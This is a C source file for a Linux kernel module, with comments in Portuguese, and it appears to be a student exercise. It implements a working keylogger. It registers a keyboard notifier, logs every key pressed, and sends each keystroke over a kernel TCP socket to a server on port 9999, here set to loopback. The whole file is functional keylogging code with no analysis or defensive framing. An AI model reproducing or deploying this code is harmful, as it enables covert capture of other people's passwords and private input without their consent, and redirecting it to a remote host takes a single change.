#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/net.h>
#include <linux/netdevice.h>
#include <linux/skbuff.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <net/netlink.h>
#include <net/net_namespace.h>
#include <asm/sockios.h>
#include <linux/keyboard.h>

//Define a porta
#define SERVER_PORT 9999

//Define as structs globais
static struct socket *sock = NULL;
struct sockaddr_in server_addr;
static struct notifier_block nb;

//Função que fica rodando enquanto o módulo está funcionando
int keyboard_notifier(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    //Tecla acionada
    if (code == KBD_KEYSYM && param->down) {
        //Imprime no terminal do módulo a tecla acionada
        printk(KERN_INFO "Tecla pressionada: %c\n", param->value);

        int ret = -1;
        // Envio da mensagem
        const char *message = (const char[]) {param->value, 'o', '\0'};
        struct msghdr msg = {
            .msg_name = NULL,
            .msg_namelen = 0,
            .msg_flags = 0,
        };
        struct kvec iov = {
            .iov_base = (void *)message,
            .iov_len = strlen(message),
        };
        ret = kernel_sendmsg(sock, &msg, &iov, 1, 1); //Manda a tecla acionada
        if (ret < 0) {
            printk(KERN_ALERT "Erro ao enviar a mensagem\n");
        } 
    }

      return NOTIFY_OK;
}

//Função de inicialização do modulo
static int __init client_init(void) {
    printk(KERN_INFO "Inicializando módulo de kernel (cliente)\n");
  
    int ret;
    struct sockaddr_in client_addr;

    // Criação do socket
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        printk(KERN_ALERT "Erro ao criar o socket\n");
        return ret;
    }

    // Definição do endereço do servidor
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // Endereço do servidor na mesma máquina (loopback)

    // Conexão com o servidor
    ret = sock->ops->connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
    if (ret < 0) {
        printk(KERN_ALERT "Erro ao conectar-se ao servidor\n");
        sock_release(sock);
        return ret;
    }
    
    nb.notifier_call = keyboard_notifier;
    register_keyboard_notifier(&nb);
  
    return 0;
}

//Função de termino do modulo
static void __exit client_exit(void) {
  
    unregister_keyboard_notifier(&nb);
    
    // Fechamento do socket
    sock_release(sock);
  
    printk(KERN_INFO "Encerrando módulo de kernel (cliente)\n");
}

module_init(client_init);
module_exit(client_exit);

MODULE_LICENSE("GPL");

